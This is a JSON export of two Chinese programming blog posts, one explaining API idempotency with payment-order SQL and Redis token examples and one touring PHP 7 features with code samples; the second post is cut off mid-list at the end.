{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "接口的幂等性原则", "log_Intro": "接口的幂等性原则", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>接口调用存在的问题</h3>\n\n<p> 现如今我们的系统大多拆分为分布式SOA，或者微服务，一套系统中包含了多个子系统服务，而一个子系统服务往往会去调用另一个服务，而服务调用服务无非就是使用RPC通信或者restful，既然是通信，那么就有可能在服务器处理完毕后返回结果的时候挂掉，这个时候用户端发现很久没有反应，那么就会多次点击按钮，这样请求有多次，那么处理数据的结果是否要统一呢？那是肯定的！尤其在支付场景。</p>\n\n<h3>什么是接口幂等性</h3>\n\n<p>接口幂等性就是用户对于同一操作发起的一次请求或者多次请求的结果是一致的，不会因为多次点击而产生了副作用。举个最简单的例子，那就是支付，用户购买商品后支付，支付扣款成功，但是返回结果的时候网络异常，此时钱已经扣了，用户再次点击按钮，此时会进行第二次扣款，返回结果成功，用户查询余额返发现多扣钱了，流水记录也变成了两条．．．,这就没有保证接口的幂等性</p>\n\n<h3>什么情况下需要保证接口的幂等性</h3>\n\n<p>在增删改查4个操作中，尤为注意就是增加或者修改，</p>\n\n<p><strong>A: 查询操作</strong></p>\n\n<pre class=\"has\">\n<code> 查询对于结果是不会有改变的，查询一次和查询多次，在数据不变的情况下，查询结果是一样的。select是天然的幂等操作</code></pre>\n\n<p><strong>B: 删除操作</strong></p>\n\n<pre class=\"has\">\n<code>删除一次和多次删除都是把数据删除。(注意可能返回结果不一样，删除的数据不存在，返回0，删除的数据多条，返回结果多个,在不考虑返回结果的情况下,删除操作也是具有幂等性的)</code></pre>\n\n<p><strong>C: 更新操作</strong></p>\n\n<p>修改在大多场景下结果一样,但是如果是增量修改是需要保证幂等性的,如下例子:</p>\n\n<p>把表中id为XXX的记录的A字段值设置为1,这种操作不管执行多少次都是幂等的<br>\n把表中id为XXX的记录的A字段值增加1,这种操作就不是幂等的</p>\n\n<p><strong>D: 新增操作</strong></p>\n\n<p>增加在重复提交的场景下会出现幂等性问题,如以上的支付问题</p>\n\n<ol><li>\n\t<p>那么如何设计接口才能做到幂等呢？</p>\n\n\t<p>常见的两种实现方案: 1. 通过代码逻辑判断实现 2. 使用token机制实现 下面以支付系统为例,分别对接口的幂等性进行说明与实现</p>\n\n\t<p>A: 通过代码逻辑判断实现接口幂等性,只能针对一些满足判断的逻辑实现,具有一定局限性</p>\n\n\t<p>用户购买商品的订单系统与支付系统；订单系统负责记录用户的购买记录已经订单的流转状态（orderStatus),支付系统用于付款，提供如下接口，订单系统与支付系统通过分布式网络交互。</p>\n\t</li>\n</ol><p>boolean pay(int accountid,BigDecimal amount) //用于付款，扣除用户的</p>\n\n<p>这种情况下，支付系统已经扣款，但是订单系统因为网络原因，没有获取到确切的结果，因此订单系统需要重试。由上图可见，支付系统并没有做到接口的幂等性，订单系统第一次调用和第二次调用，用户分别被扣了两次钱，不符合幂等性原则（同一个订单，无论是调用了多少次，用户都只会扣款一次）。如果需要支持幂等性，付款接口需要修改为以下接口：</p>\n\n<p>boolean pay(int orderId,int accountId,BigDecimal amount)</p>\n\n<p>通过orderId来标定订单的唯一性，付款系统只要检测到订单已经支付过，则第二次调用不会扣款而会直接返回结果：</p>\n\n<p>在不同的业务中不同接口需要有不同的幂等性，特别是在分布式系统中，因为网络原因而未能得到确定的结果，往往需要支持接口幂等性。</p>\n\n<p>随着分布式系统及微服务的普及，因为网络原因而导致调用系统未能获取到确切的结果从而导致重试，这就需要被调用系统具有幂等性。例如上文所阐述的支付系统，针对同一个订单保证支付的幂等性，一旦订单的支付状态确定之后，以后的操作都会返回相同的结果，对用户的扣款也只会有一次。这种接口的幂等性，简化到数据层面的操作：</p>\n\n<p>update userAmount set amount = amount - 'value' ,paystatus = 'paid' where orderId= 'orderid' and paystatus = 'unpay'</p>\n\n<p>其中value是用户要减少的订单，paystatus代表支付状态，paid代表已经支付，unpay代表未支付，orderid是订单号。</p>\n\n<p>在上文中提到的订单系统，订单具有自己的状态（orderStatus),订单状态存在一定的流转。订单首先有提交（0），付款中（1），付款成功（2），付款失败（3），简化之后其流转路径如图：</p>\n\n<p>当orderStatus = 1 时，其前置状态只能是0，也就是说将orderStatus由0-&gt;1 是需要幂等性的<br>\nupdate Order set orderStatus = 1 where OrderId = 'orderid' and orderStatus = 0<br>\n当orderStatus 处于0，1两种状态时，对订单执行0-&gt;1 的状态流转操作应该是具有幂等性的。这时候需要在执行update操作之前检测orderStatus是否已经=1，如果已经=1则直接返回true即可。</p>\n\n<p>但是如果此时orderStatus = 2,再进行订单状态0-&gt;1 时操作就无法成功，但是幂等性是针对同一个请求的，也就是针对同一个requestid保持幂等。</p>\n\n<p>这时候再执行</p>\n\n<p>update Order set orderStatus = 1 where OrderId = 'orderid' and orderStatus = 0<br>\n接口会返回失败，系统没有产生修改，如果再发一次，requestid是相同的，对系统同样没有产生修改。</p>\n\n<p>B: 使用token机制实现接口幂等性,通用性强的实现方法</p>\n\n<h3> token机制实现步骤:</h3>\n\n<p> 1. 生成全局唯一的token,token放到redis或jvm内存,token会在页面跳转时获取.存放到pageScope中,支付请求提交先获取token</p>\n\n<p> 2. 提交后后台校验token，执行提交逻辑,提交成功同时删除token，生成新的token更新redis ,这样当第一次提交后token更新了,页面再次提交携带的token是已删除的token后台验证会失败不让提交</p>\n\n<p><br>\n token特点：   要申请，一次有效性，可以限流</p>\n\n<p> <strong>注意：</strong> redis要用删除操作来判断token，删除成功代表token校验通过，如果用select+delete来校验token，存在并发问题，不建议使用</p>\n                                    </div>", "log_PostTime": 1584891209, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "PHP 7 新特性", "log_Intro": "PHP 7 新特性", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>PHP 7+ </strong>版本极大地改进了性能，在一些WordPress基准测试当中，性能可以达到<strong>PHP 5.6</strong>的3倍。</p>\n\n<p><strong>PHP 7+ </strong>版本新加特性如下表所示：</p>\n\n<h3>一、PHP 标量类型与返回值类型声明</h3>\n\n<p><strong>标量类型声明</strong></p>\n\n<p>默认情况下，所有的PHP文件都处于弱类型校验模式。</p>\n\n<p>PHP 7 增加了标量类型声明的特性，标量类型声明有两种模式:</p>\n\n<ul><li>强制模式 (默认)</li>\n\t<li>严格模式</li>\n</ul><p>标量类型声明语法格式：</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">declare(strict_types=1); </code></pre>\n\n<p>代码中通过指定 strict_types的值（1或者0），1表示严格类型校验模式，作用于函数调用和返回语句；0表示弱类型校验模式。</p>\n\n<p>可以使用的类型参数有：</p>\n\n<ul><li>\n\t<p>int</p>\n\t</li>\n\t<li>\n\t<p>float</p>\n\t</li>\n\t<li>\n\t<p>bool</p>\n\t</li>\n\t<li>\n\t<p>string</p>\n\t</li>\n\t<li>\n\t<p>interfaces</p>\n\t</li>\n\t<li>\n\t<p>array</p>\n\t</li>\n\t<li>\n\t<p>callable</p>\n\t</li>\n</ul><p><strong>强制模式实例</strong></p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \n// 强制模式 \nfunction sum(int ...$ints) \n{ \n   return array_sum($ints); \n} \n\nprint(sum(2, '3', 4.1)); \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">9</code></pre>\n\n<p>实例汇总将参数 4.1 转换为整数 4 后再相加。</p>\n\n<p><strong>严格模式实例</strong></p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \n// 严格模式 \ndeclare(strict_types=1); \n\nfunction sum(int ...$ints) \n{ \n   return array_sum($ints); \n} \n\nprint(sum(2, '3', 4.1)); \n?&gt;</code></pre>\n\n<p>以上程序由于采用了严格模式，所以如果参数中出现不适整数的类型会报错，执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">PHP Fatal error:  Uncaught TypeError: Argument 2 passed to sum() must be of the type integer, string given, called in……</code></pre>\n\n<hr><p><strong>返回类型声明</strong></p>\n\n<p>PHP 7 增加了对返回类型声明的支持，返回类型声明指明了函数返回值的类型。</p>\n\n<p>可以声明的返回类型有：</p>\n\n<ul><li>\n\t<p>int</p>\n\t</li>\n\t<li>\n\t<p>float</p>\n\t</li>\n\t<li>\n\t<p>bool</p>\n\t</li>\n\t<li>\n\t<p>string</p>\n\t</li>\n\t<li>\n\t<p>interfaces</p>\n\t</li>\n\t<li>\n\t<p>array</p>\n\t</li>\n\t<li>\n\t<p>callable</p>\n\t</li>\n</ul><p><strong>返回类型声明实例</strong></p>\n\n<p>实例中，要求返回结果为整数：</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \ndeclare(strict_types=1); \n\nfunction returnIntValue(int $value): int \n{ \n   return $value; \n} \n\nprint(returnIntValue(5)); \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">5</code></pre>\n\n<p><strong>返回类型声明错误实例</strong></p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \ndeclare(strict_types=1); \n\nfunction returnIntValue(int $value): int \n{ \n   return $value + 1.0; \n} \n\nprint(returnIntValue(5)); \n?&gt;</code></pre>\n\n<p>以上程序由于采用了严格模式，返回值必须是 int，但是计算结果是float，所以会报错，执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">Fatal error: Uncaught TypeError: Return value of returnIntValue() must be of the type integer, float returned...</code></pre>\n\n<p>对于标量类型声明：在严格模式下，有一种例外的情况是：当函数参数为float时，传入int型变量不会跑出typeerror，而是正常执行，在返回类型声明中，也是同样的:</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php\ndeclare(strict_types = 1);\nfunction test (float $inter) {\n    return $inter;\n}\n\necho test(2); // 结果为2\n\nfunction test1(int $inte) : float{\n    return $inte;\n}\necho test1(1); // 结果为1\n?&gt;</code></pre>\n\n<h3> 二、PHP NULL 合并运算符</h3>\n\n<p>PHP 7 新增加的 NULL 合并运算符（??）是用于执行isset()检测的三元运算的快捷方式。</p>\n\n<p>NULL 合并运算符会判断变量是否存在且值不为NULL，如果是，它就会返回自身的值，否则返回它的第二个操作数。</p>\n\n<p>以前我们这样写三元运算符：</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">$site = isset($_GET['site']) ? $_GET['site'] : '教程';</code></pre>\n\n<p>现在我们可以直接这样写：</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">$site = $_GET['site'] ?? '教程';</code></pre>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php\n// 获取 $_GET['site'] 的值，如果不存在返回 '教程'\n$site = $_GET['site'] ?? '教程';\n\nprint($site);\nprint(PHP_EOL); // PHP_EOL 为换行符\n\n\n// 以上代码等价于\n$site = isset($_GET['site']) ? $_GET['site'] : '教程';\n\nprint($site);\nprint(PHP_EOL);\n// ?? 链\n$site = $_GET['site'] ?? $_POST['site'] ?? '教程';\n\nprint($site);\n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">教程\n教程\n教程</code></pre>\n\n<h3>三、PHP 太空船运算符（组合比较符）</h3>\n\n<p>PHP 7 新增加的太空船运算符（组合比较符）用于比较两个表达式 <strong>$a</strong> 和 <strong>$b</strong>，如果 <strong>$a</strong> 小于、等于或大于 <strong>$b</strong>时，它分别返回-1、0或1。</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php\n// 整型比较\nprint( 1 &lt;=&gt; 1);print(PHP_EOL);\nprint( 1 &lt;=&gt; 2);print(PHP_EOL);\nprint( 2 &lt;=&gt; 1);print(PHP_EOL);\nprint(PHP_EOL); // PHP_EOL 为换行符\n\n// 浮点型比较\nprint( 1.5 &lt;=&gt; 1.5);print(PHP_EOL);\nprint( 1.5 &lt;=&gt; 2.5);print(PHP_EOL);\nprint( 2.5 &lt;=&gt; 1.5);print(PHP_EOL);\nprint(PHP_EOL);\n\n// 字符串比较\nprint( \"a\" &lt;=&gt; \"a\");print(PHP_EOL);\nprint( \"a\" &lt;=&gt; \"b\");print(PHP_EOL);\nprint( \"b\" &lt;=&gt; \"a\");print(PHP_EOL);\n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">0\n-1\n1\n\n0\n-1\n1\n\n0\n-1\n1</code></pre>\n\n<p><strong>大小字母ASCII码值</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">大写：\nA → 65，B → 66，C → 67，D → 68，E → 69，\nF → 70，G → 71，H → 72，I → 73，J → 74，\nK → 75，L → 76，M → 77，N → 78，O → 79，\nP → 80，Q → 81，R → 82，S → 83，T → 84，\nU → 85，V → 86，W → 87，X → 88，Y → 89，Z → 90\n小写：\na → 97，b → 98，c → 99，d → 100，e → 101，f → 102，\ng → 103，h → 104，i → 105，j → 106，k → 107，l → 108，\nm → 109，n → 110，o → 111，p→ 112，q → 113，r → 114，\ns → 115，t → 116，u → 117，v → 118，w → 119，x → 120，y → 121，z → 122 </code></pre>\n\n<h3>四、PHP 常量数组</h3>\n\n<p>在 PHP 5.6 中仅能通过 const 定义常量数组，PHP 7 可以通过 define() 来定义。</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php\n// 使用 define 函数来定义数组\ndefine('sites', [\n   'Google',\n   'Runoob',\n   'Taobao'\n]);\n\nprint(sites[1]);\n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">Runoob</code></pre>\n\n<h3>五、PHP 匿名类</h3>\n\n<p>PHP 7 支持通过 <strong>new class</strong> 来实例化一个匿名类，这可以用来替代一些\"用后即焚\"的完整类定义。</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \ninterface Logger { \n   public function log(string $msg); \n} \n\nclass Application { \n   private $logger; \n\n   public function getLogger(): Logger { \n      return $this-&gt;logger; \n   } \n\n   public function setLogger(Logger $logger) { \n      $this-&gt;logger = $logger; \n   }   \n} \n\n$app = new Application; \n// 使用 new class 创建匿名类 \n$app-&gt;setLogger(new class implements Logger { \n   public function log(string $msg) { \n      print($msg); \n   } \n}); \n\n$app-&gt;getLogger()-&gt;log(\"我的第一条日志\"); \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">我的第一条日志</code></pre>\n\n<h3>六、PHP Closure::call()</h3>\n\n<p>PHP 7 的 Closure::call() 有着更好的性能，将一个闭包函数动态绑定到一个新的对象实例并调用执行该函数。</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \nclass A { \n    private $x = 1; \n} \n\n// PHP 7 之前版本定义闭包函数代码 \n$getXCB = function() { \n    return $this-&gt;x; \n}; \n\n// 闭包函数绑定到类 A 上 \n$getX = $getXCB-&gt;bindTo(new A, 'A');  \n\necho $getX(); \nprint(PHP_EOL); \n\n// PHP 7+ 代码 \n$getX = function() { \n    return $this-&gt;x; \n}; \necho $getX-&gt;call(new A); \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">1\n1</code></pre>\n\n<h3>七、PHP 过滤 unserialize()</h3>\n\n<p>PHP 7 增加了可以为 unserialize() 提供过滤的特性，可以防止非法数据进行代码注入，提供了更安全的反序列化数据。</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \nclass MyClass1 {  \n   public $obj1prop;    \n} \nclass MyClass2 { \n   public $obj2prop; \n} \n\n\n$obj1 = new MyClass1(); \n$obj1-&gt;obj1prop = 1; \n$obj2 = new MyClass2(); \n$obj2-&gt;obj2prop = 2; \n\n$serializedObj1 = serialize($obj1); \n$serializedObj2 = serialize($obj2); \n\n// 默认行为是接收所有类 \n// 第二个参数可以忽略 \n// 如果 allowed_classes 设置为 false, unserialize 会将所有对象转换为 __PHP_Incomplete_Class 对象 \n$data = unserialize($serializedObj1 , [\"allowed_classes\" =&gt; true]); \n\n// 转换所有对象到 __PHP_Incomplete_Class 对象，只允许 MyClass1 和 MyClass2 转换到 __PHP_Incomplete_Class \n$data2 = unserialize($serializedObj2 , [\"allowed_classes\" =&gt; [\"MyClass1\", \"MyClass2\"]]); \n\nprint($data-&gt;obj1prop); \nprint(PHP_EOL); \nprint($data2-&gt;obj2prop); \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">1\n2</code></pre>\n\n<h3>八、PHP IntlChar()</h3>\n\n<p>PHP 7 通过 intl 扩展来支持国际化 (i18n) 和本地化 (l10n) 。此扩展仅仅是对 ICU 库的基础包装，并提供了和 ICU 库类似的方法和特性。</p>\n\n<p>PHP 7 通过新的 IntlChar 类暴露出 ICU 中的 Unicode 字符特性。这个类自身定义了许多静态方法用于操作多字符集的 unicode 字符。</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \nprintf('%x', IntlChar::CODEPOINT_MAX); \necho IntlChar::charName('@'); \nvar_dump(IntlChar::ispunct('!')); \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">10ffff\nCOMMERCIAL AT\nbool(true)</code></pre>\n\n<h3>九、PHP CSPRNG</h3>\n\n<p>CSPRNG（Cryptographically Secure Pseudo-Random Number Generator，伪随机数产生器）。</p>\n\n<p>PHP 7 通过引入几个 CSPRNG 函数提供一种简单的机制来生成密码学上强壮的随机数。</p>\n\n<ul><li>\n\t<p><strong>random_bytes()</strong> - 加密生存被保护的伪随机字符串。</p>\n\t</li>\n\t<li>\n\t<p><strong>random_int()</strong> - 加密生存被保护的伪随机整数。</p>\n\t</li>\n</ul><hr><p><strong>random_bytes()</strong></p>\n\n<p><strong>语法格式</strong></p>\n\n<pre>\n<code class=\"language-html hljs\">string random_bytes ( int $length )</code></pre>\n\n<p><strong>参数</strong></p>\n\n<ul><li>\n\t<p><strong>length</strong> - 随机字符串返回的字节数。</p>\n\t</li>\n</ul><p><strong>返回值</strong></p>\n\n<ul><li>\n\t<p>返回一个字符串，接受一个int型入参代表返回结果的字节数。</p>\n\t</li>\n</ul><p><strong>实例</strong></p>\n\n<p>&lt;?php <br>\n$bytes = random_bytes(5); <br>\nprint(bin2hex($bytes)); <br>\n?&gt;</p>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">6f36d48a29</code></pre>\n\n<hr><p><strong>random_int()</strong></p>\n\n<p><strong>语法格式</strong></p>\n\n<pre>\n<code class=\"language-html hljs\">int random_int ( int $min , int $max )</code></pre>\n\n<p><strong>参数</strong></p>\n\n<ul><li>\n\t<p><strong>min</strong> - 返回的最小值，必须是大于或等于 PHP_INT_MIN 。</p>\n\t</li>\n\t<li>\n\t<p><strong>max</strong> - 返回的最大值，必须是小于或等于 PHP_INT_MAX 。</p>\n\t</li>\n</ul><p><strong>返回值</strong></p>\n\n<ul><li>\n\t<p>返回一个指定范围内的int型数字。</p>\n\t</li>\n</ul><p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \nprint(random_int(100, 999)); \nprint(PHP_EOL); \nprint(random_int(-1000, 0)); \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">723\n-64</code></pre>\n\n<h3>十、PHP 7 异常</h3>\n\n<p>PHP 7 异常用于向下兼容及增强旧的assert()函数。它能在生产环境中实现零成本的断言，并且提供抛出自定义异常及错误的能力。</p>\n\n<p>老版本的API出于兼容目的将继续被维护，assert()现在是一个语言结构，它允许第一个参数是一个表达式，而不仅仅是一个待计算的 string或一个待测试的boolean。</p>\n\n<hr><p><strong>assert() 配置</strong></p>\n\n<table><tbody><tr><th>配置项</th>\n\t\t\t<th>默认值</th>\n\t\t\t<th>可选值</th>\n\t\t</tr><tr><td>zend.assertions</td>\n\t\t\t<td>1</td>\n\t\t\t<td>\n\t\t\t<ul><li>\n\t\t\t\t<p><strong>1</strong> - 生成和执行代码 (开发模式)</p>\n\t\t\t\t</li>\n\t\t\t\t<li>\n\t\t\t\t<p><strong>0</strong> - 生成代码，但在执行时跳过它</p>\n\t\t\t\t</li>\n\t\t\t\t<li>\n\t\t\t\t<p><strong>-1</strong> - 不生成代码 (生产环境)</p>\n\t\t\t\t</li>\n\t\t\t</ul></td>\n\t\t</tr><tr><td>assert.exception</td>\n\t\t\t<td>0</td>\n\t\t\t<td>\n\t\t\t<ul><li>\n\t\t\t\t<p><strong>1</strong> - 断言失败时抛出，可以抛出异常对象，如果没有提供异常，则抛出 AssertionError 对象实例。</p>\n\t\t\t\t</li>\n\t\t\t\t<li>\n\t\t\t\t<p><strong>0</strong> - 使用或生成 Throwable, 仅仅是基于对象生成的警告而不是抛出对象(与 PHP 5 兼容)</p>\n\t\t\t\t</li>\n\t\t\t</ul></td>\n\t\t</tr></tbody></table><p><strong>参数</strong></p>\n\n<p><strong>assertion</strong></p>\n\n<p>断言。在 PHP 5 中，是一个用于执行的字符串或者用于测试的布尔值。在 PHP 7 中，可以是一个返回任何值的表达式， 它将被执行结果用于指明断言是否成功。</p>\n\n<p><strong>description</strong></p>\n\n<p>如果 <code>assertion</code> 失败了，选项 description 将会包括在失败信息里。</p>\n\n<p><strong>exception</strong></p>\n\n<p>在 PHP 7 中，第二个参数可以是一个 <strong>Throwable</strong> 对象，而不是一个字符串，如果断言失败且启用了 assert.exception 该对象将被抛出。</p>\n\n<p><strong>实例</strong></p>\n\n<p>将 zend.assertions 设置为 0：</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \nini_set('zend.assertions', 0); \n\nassert(true == false); \necho 'Hi!'; \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">Hi!</code></pre>\n\n<p>将 zend.assertions 设置为 1，assert.exception 设置为 1：</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \nini_set('zend.assertions', 1); \nini_set('assert.exception', 1); \n\nassert(true == false); \necho 'Hi!'; \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">Fatal error: Uncaught AssertionError: assert(true == false) in -:2\nStack trace:\n#0 -(2): assert(false, 'assert(true == ...')\n#1 {main}\n  thrown in - on line 2</code></pre>\n\n<h3>十一、PHP 7 use 语句</h3>\n\n<p>PHP 7 可以使用一个 use 从同一个 namespace 中导入类、函数和常量：</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">// PHP 7 之前版本需要使用多次 use \nuse some\\namespace\\ClassA; \nuse some\\namespace\\ClassB; \nuse some\\namespace\\ClassC as C; \n\nuse function some\\namespace\\fn_a; \nuse function some\\namespace\\fn_b; \nuse function some\\namespace\\fn_c; \n\nuse const some\\namespace\\ConstA; \nuse const some\\namespace\\ConstB; \nuse const some\\namespace\\ConstC; \n\n// PHP 7+ 之后版本可以使用一个 use 导入同一个 namespace 的类 \nuse some\\namespace\\{ClassA, ClassB, ClassC as C}; \nuse function some\\namespace\\{fn_a, fn_b, fn_c}; \nuse const some\\namespace\\{ConstA, ConstB, ConstC}; \n?&gt;</code></pre>\n\n<h3>十二、PHP 7 错误处理</h3>\n\n<p>PHP 7 改变了大多数错误的报告方式。不同于 PHP 5 的传统错误报告机制，现在大多数错误被作为 <strong>Error</strong> 异常抛出。</p>\n\n<p>这种 Error 异常可以像普通异常一样被 try / catch 块所捕获。如果没有匹配的 try / catch 块， 则调用异常处理函数（由 set_exception_handler() 注册）进行处理。 如果尚未注册异常处理函数，则按照传统方式处理：被报告为一个致命错误（Fatal Error）。</p>\n\n<p>Error 类并不是从 Exception 类 扩展出来的，所以用 catch (Exception $e) { ... } 这样的代码是捕获不 到 Error 的。你可以用 catch (Error $e) { ... } 这样的代码，或者通过注册异常处理函数（ set_exception_handler()）来捕获 Error。</p>\n\n<p><strong>Error 异常层次结构</strong></p>\n\n<ul><li><strong>Error</strong>\n\n\t<ul><li><strong>ArithmeticError</strong></li>\n\t\t<li><strong>AssertionError</strong></li>\n\t\t<li><strong>DivisionByZeroError</strong></li>\n\t\t<li><strong>ParseError</strong></li>\n\t\t<li><strong>TypeError</strong></li>\n\t</ul></li>\n</ul><p> </p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \nclass MathOperations  \n{ \n   protected $n = 10; \n\n   // 求余数运算，除数为 0，抛出异常 \n   public function doOperation(): string \n   { \n      try { \n         $value = $this-&gt;n % 0; \n         return $value; \n      } catch (DivisionByZeroError $e) { \n         return $e-&gt;getMessage(); \n      } \n   } \n} \n\n$mathOperationsObj = new MathOperations(); \nprint($mathOperationsObj-&gt;doOperation()); \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">Modulo by zero</code></pre>\n\n<h3>十三、PHP intdiv() 函数</h3>\n\n<p>PHP 7 新增加了 intdiv() 函数，接收两个参数，返回值为第一个参数除于第二个参数的值并取整。</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \necho intdiv(9,3),PHP_EOL; \necho intdiv(10,3),PHP_EOL; \necho intdiv(5,10),PHP_EOL; \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">3\n3\n0</code></pre>\n\n<h3>十四、PHP 7 Session 选项</h3>\n\n<p>PHP 7 session_start() 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。</p>\n\n<p>这个特性也引入了一个新的 php.ini 设置（session.lazy_write）, 默认情况下设置为 true，意味着 session 数据只在发生变化时才写入。</p>\n\n<p>除了常规的会话配置指示项， 还可以在此数组中包含 read_and_close 选项。如果将此选项的值设置为 TRUE， 那么会话文件会在读取完毕之后马上关闭， 因此，可以在会话数据没有变动的时候，避免不必要的文件锁。</p>\n\n<p>把 cache_limiter 设置为私有的，同时在阅读完 session 后立即关闭。</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php session_start([ 'cache_limiter' =&gt; 'private', 'read_and_close' =&gt; true, ]); ?&gt;</code></pre>\n\n<p>php7 以前，我们使用 session 前都是要先代用 session_strat() 函数来初始化的，但这个函数是没有参数可以传的，session 的配置都在 php.ini 文件中。</p>\n\n<p>在 php7 后 session_start() 可以接受一个 array 作为参数， 用来覆盖 php.ini 文件中设置的会话配置选项。</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">session_start([\n   'cache_limiter' =&gt; 'private', //在读取完毕会话数据之后马上关闭会话存储文件\n    'cookie_lifetime'=&gt;3600,   //SessionID在客户端Cookie储存的时间，默认是0，代表浏览器一关闭SessionID就作废\n    'read_and_close'=&gt;true   //在读取完会话数据之后， 立即关闭会话存储文件，不做任何修改\n]);\n$_SESSION['name']='quan';\necho $_SESSION['name'];</code></pre>\n\n<h3>十五、PHP 7 废弃特性</h3>\n\n<p><strong>PHP4 风格的构造函数</strong></p>\n\n<p>在 PHP4 中类中的函数可以与类名同名，这一特性在 PHP7 中被废弃，同时会发出一个 E_DEPRECATED 错误。当方法名与类名相同，且类不在命名空间中，同时PHP5的构造函数（__construct）不存在时，会产生一个 E_DEPRECATED 错误。</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \nclass A { \n   function A() { \n      print('Style Constructor'); \n   } \n} \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">Deprecated: Methods with the same name as their class will not be constructors in a future version of PHP; A has a deprecated constructor in...</code></pre>\n\n<hr><p><strong>以静态的方式调用非静态方法</strong></p>\n\n<p>以静态的方式调用非静态方法，不再支持：</p>\n\n<p><strong>实例</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \nclass A { \n   function b() { \n      print('Non-static call'); \n   } \n} \nA::b(); \n?&gt;</code></pre>\n\n<p>以上程序执行输出结果为：</p>\n\n<pre>\n<code class=\"language-html hljs\">Deprecated: Non-static method A::b() should not be called statically in...\nNon-static call</code></pre>\n\n<hr><p><strong>password_hash() 随机因子选项</strong></p>\n\n<p>函数原 salt 量不再需要由开发者提供了。函数内部默认带有 salt 能力，无需开发者提供 salt 值。</p>\n\n<hr><p><strong>capture_session_meta SSL 上下文选项</strong></p>\n\n<p>废弃了 \"capture_session_meta\" SSL 上下文选项。 在流资源上活动的加密相关的元数据可以通过 <strong>stream_get_meta_data()</strong> 的返回值访问。</p>\n\n<h3>十六、PHP 7 移除的扩展</h3>\n\n<p>PHP 7+ 版本移除了以下扩展：</p>\n\n<ul><li>\n\t<p>ereg</p>\n\t</li>\n\t<li>\n\t<p>mssql</p>\n\t</li>\n\t<li>\n\t<p>mysql</p>\n\t</li>\n\t<li>\n\t<p>sybase_ct</p>\n\t</li>\n</ul><h3>十七、PHP 7 移除的 SAPI</h3>\n\n<p>PHP 7+ 版本移除了以下 